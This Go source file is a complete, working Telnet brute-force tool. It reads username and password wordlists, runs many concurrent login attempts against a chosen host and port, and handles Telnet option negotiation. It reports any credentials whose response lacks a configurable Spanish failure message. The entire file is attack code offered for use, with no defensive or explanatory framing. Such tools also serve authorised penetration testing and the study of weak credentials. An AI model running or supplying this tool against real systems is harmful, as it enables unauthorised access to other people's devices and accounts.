package main
import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
)

const FAILURE_MESSAGE = "Inicio de sesión incorrecto" // CHANGE THIS

var Green = "\033[32m"
var Reset = "\033[0m"

type Credentials struct {
	User     string
	Password string
}

type ResultCode int

const (
	ERROR   ResultCode = -1
	FAILURE ResultCode = 0
	SUCCESS ResultCode = 1
	SIGNAL  ResultCode = 2
)

func main() {
	host := flag.String("i", "", "Host")
	port := flag.Uint("p", 23, "Port")
	userlist := flag.String("u", "", "wordlist of usernames")
	passlist := flag.String("w", "", "wordlist of passwords")
	workerCount := flag.Int("t", 40, "number of threads")
	passwordOnly := flag.Bool("op", false, "Only-password mode")
	flag.Parse()

	if flag.NArg() != 0 ||
		*host == "" ||
		(*userlist == "" && !*passwordOnly) ||
		*passlist == "" {
		fmt.Println("Usage: program -i host [-p port] -u userlist -w passlist [-t threads] [-op]")
		return
	}

	if *userlist == "" {
		*userlist = ".default_userlist.txt"
	}

  // Display program prompt
  var texts []string
  texts = append(texts, "Telnet bruteforce tool")
  texts = append(texts, "Host: " + *host)
	if !*passwordOnly {
   texts = append(texts, "User wordlist: " + *userlist)
	}
  texts = append(texts, "Password wordlist: " + *passlist)
  texts = append(texts, fmt.Sprintf("Port: %d",*port))
  texts = append(texts, fmt.Sprintf("Threads: %d",*workerCount))
  texts = append(texts, "Error message: " + FAILURE_MESSAGE)
	if *passwordOnly {
   texts = append(texts,"Password-only mode")
	}
	fmt.Println("+-------------------------------------------------+")
  for _, text := range texts {
    if len(text) > 48 {
      text = text[:45] + "..."
    }
    fmt.Printf("| %-48s|\n", text)
  }
	fmt.Println("+-------------------------------------------------+")
	fmt.Println()

  // Operations
	time.Sleep(time.Second)
	bruteforceTelnet(*host, *userlist, *passlist, *port, *workerCount, *passwordOnly)
}

func bruteforceTelnet(host, userlist, passlist string, port uint, threads int, passwordOnly bool) {
	// prepare files
	usernameFile, err := os.Open(userlist)
	if err != nil {
		fmt.Printf("Error opening %s \n", usernameFile)
		return
	}
	defer usernameFile.Close()
	usernameFilescaner := bufio.NewScanner(usernameFile)

	passwordFile, err := os.Open(passlist)
	if err != nil {
		fmt.Printf("Error opening %s \n", passwordFile)
		return
	}
	defer passwordFile.Close()
	passwordFilescaner := bufio.NewScanner(passwordFile)

	// prepare signals
	signals := make(chan os.Signal, 1)
	signal.Notify(signals, syscall.SIGTERM, syscall.SIGINT)

	// prepare workers
	var wg sync.WaitGroup
	credentialsChan := make(chan *Credentials)
	validCredentialsChan := make(chan *Credentials)
	resultsChan := make(chan ResultCode)
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(credentialsChan, resultsChan, host, port, &wg, validCredentialsChan, passwordOnly)
	}

	// brute-force
	go func() {
		for usernameFilescaner.Scan() {
			usr := usernameFilescaner.Text()
			for passwordFilescaner.Scan() {
				pass := passwordFilescaner.Text()
				credentialsChan <- &Credentials{User: usr, Password: pass}
			}
			passwordFile.Seek(0, 0)
			passwordFilescaner = bufio.NewScanner(passwordFile)
		}
		close(credentialsChan)
	}()

	// goroutine to close the channels
	go func() {
		wg.Wait()
		close(resultsChan)
		close(validCredentialsChan)
		close(signals)
	}()

	// goroutine to show the valid credentials
	var validCredentials []string
	go func() {
		for c := range validCredentialsChan {
			fmt.Printf("%sPositive Response: Username: %s Password: %s %s\n",
				Green, c.User, c.Password, Reset)
			validCredentials = append(validCredentials, fmt.Sprintf("Username: %s, Password: %s", c.User, c.Password))
		}
	}()

	// goroutine to handle signals
	go func() {
		sig := <-signals
		fmt.Printf("\n\n")
		if sig != nil {
			fmt.Println("Received signal:", sig)
		}
		if len(validCredentials) != 0 {
			fmt.Println("Credentials found:")
			for _, cred := range validCredentials {
				fmt.Println(Green + cred + Reset)
			}
		}
		os.Exit(0)
	}()

	for _ = range resultsChan {
	} // just wait for the results
}

func worker(credentialsChan chan *Credentials, resultsChan chan ResultCode, host string, port uint, wg *sync.WaitGroup, validCredentialsChan chan *Credentials, passwordOnly bool) {
	defer wg.Done()
	for c := range credentialsChan {
		if passwordOnly {
			fmt.Printf("Trying %s\n", c.Password)
		} else {
			fmt.Printf("Trying %s:%s\n", c.User, c.Password)
		}
		address := fmt.Sprintf("%s:%d", host, port)
		// starting connection
		conn, err := net.Dial("tcp", address)
		if err != nil {
			fmt.Printf("Error connecting to %s\n", address)
			resultsChan <- ERROR
			return
		}
		defer conn.Close()
		time.Sleep(1 * time.Second)
		// trying login
		result := handleTelnetConnection(conn, c, validCredentialsChan, passwordOnly)
		resultsChan <- result
	}
}

// *************************
// ** TELNET client stuff **
// *************************
type Telnet_Command int

const (
	WILL Telnet_Command = 251
	WONT Telnet_Command = 252
	DO   Telnet_Command = 253
	DONT Telnet_Command = 254
)

type Telnet_Option int

const (
	BINARY_TRANSMISSION                Telnet_Option = 0
	ECHO                               Telnet_Option = 1
	RECONNECTION                       Telnet_Option = 2
	SURPRESS_GO_AHEAD                  Telnet_Option = 3
	APPROX_MESSAGE_SIZE_NEGOTATION     Telnet_Option = 4
	STATUS                             Telnet_Option = 5
	TIMING_MARK                        Telnet_Option = 6
	REMOTE_CONTROLLED_TRANS_AND_ECHO   Telnet_Option = 7
	OUTPUT_LINE_WIDTH                  Telnet_Option = 8
	OUTPUT_PAGE_SIZE                   Telnet_Option = 9
	OUTPUT_CARRIAGE_RETURN_DISPOSITION Telnet_Option = 10
	OUTPUT_HORIZONTAL_TABSTOPS         Telnet_Option = 11
	OUTPUT_HORIZONTAL_TAB_DISPOSITION  Telnet_Option = 12
	OUTPUT_FORMFEED_DISPOSITION        Telnet_Option = 13
	OUTPUT_VERTICAL_TABSTOPS           Telnet_Option = 14
	OUTPUT_VERTICAL_TAB_DISPOSITION    Telnet_Option = 15
	OUTPUT_LINEFEED_DISPOSITION        Telnet_Option = 16
	EXTENDED_ASCII                     Telnet_Option = 17
	LOGOUT                             Telnet_Option = 18
	BYTE_MACRO                         Telnet_Option = 19
	DATA_ENTRY_TERMINAL                Telnet_Option = 20
	// and more
	TERMINAL_TYPE  Telnet_Option = 24
	LINEMODE       Telnet_Option = 34
	AUTHENTICATION Telnet_Option = 37
	ENCRYPTION     Telnet_Option = 38
)

func handleTelnetConnection(conn net.Conn, credentials *Credentials, validCredentialsChan chan *Credentials, passwordOnly bool) ResultCode {
	buf := bufio.NewReader(conn)
	timeout := 1500 * time.Millisecond
	for {
		conn.SetReadDeadline(time.Now().Add(timeout))
		b, err := buf.ReadByte()
		if err != nil {
			if os.IsTimeout(err) {
				// send authentication
				if !passwordOnly {
					_, err = fmt.Fprintf(conn, credentials.User+"\r")
					if err != nil {
						fmt.Println("Error sending username: ", err)
						return ERROR
					}
					time.Sleep(1 * time.Second)
				}
				_, err = fmt.Fprintf(conn, credentials.Password+"\r")
				if err != nil {
					fmt.Println("Error sending password: ", err)
					return ERROR
				}

				// Read response
				time.Sleep(1 * time.Second)
				reader := bufio.NewReader(conn)
				authResponse := ""
				n := 2
				if passwordOnly {
					n--
				}
				for i := 0; i < n; i++ {
					conn.SetReadDeadline(time.Now().Add(timeout * 4))
					_, err := reader.ReadString('\n')
					if err != nil {
						fmt.Println("Error reading line ", err)
						return ERROR
					}
				}
				conn.SetReadDeadline(time.Now().Add(timeout * 4))
				authResponse, err = reader.ReadString('\n')
				if err != nil {
					fmt.Println("Error reading the string: ", err)
					return ERROR
				}
				fmt.Print(authResponse)

				// Handling the response
				if strings.Contains(authResponse, FAILURE_MESSAGE) {
					return FAILURE
				}
				validCredentialsChan <- credentials
				return SUCCESS
			}
			fmt.Println("Error reading byte:", err)
			return ERROR
		}

		if b == 255 { // Interpret as Command (IAC)
			// Commands: WILL, WONT, DO, DONT
			cmd, err := buf.ReadByte()
			if err != nil {
				fmt.Println("Error reading command:", err)
				return ERROR
			}
			// Options
			opt, err := buf.ReadByte()
			if err != nil {
				fmt.Println("Error reading option:", err)
				return ERROR
			}
			//fmt.Printf("Recieved: IAC %d %d\n", cmd, opt)
			// -----
			switch cmd {

			case byte(WILL):
				// Send IAC DO <opt>
				//fmt.Printf("Answering with: IAC DO %d\n", opt)
				_, err = conn.Write([]byte{255, 253, opt})
				if err != nil {
					fmt.Println("Error writing DO:", err)
					return ERROR
				}

			case byte(DO):
				switch opt {
				// Send IAC WILL <opt>
				case byte(BINARY_TRANSMISSION):
					//fmt.Printf("Answering with: IAC WILL %d\n", opt)
					_, err = conn.Write([]byte{255, 251, opt})
					if err != nil {
						fmt.Println("Error writing WONT:", err)
						return ERROR
					}
					// Send IAC WONT <opt>
				default:
					//fmt.Printf("Answering con: IAC WONT %d\n", opt)
					_, err = conn.Write([]byte{255, 252, opt}) // Respond with WONT <opt>
					if err != nil {
						fmt.Println("Error al escribir WONT:", err)
						return ERROR
					}
				}

			case byte(WONT), byte(DONT):
				// Do nothing
			case 250: // SB (Subnegotiation Begin)
				// Reading until end of negotiation (IAC SE)
				for {
					b, err := buf.ReadByte()
					if err != nil {
						fmt.Println("Error reading subnegotiation", err)
						return ERROR
					}
					// fmt.Printf("Subnegotiation byte: %d\n", b)
					if b == 240 { // SE (Subnegotiation End)
						break
					}
				}
			default:
				// fmt.Printf("Unhandled IAC command: %d\n", cmd)
			}
		} else {
			// Print banner
			// fmt.Print(string(b))
		}
	}
}
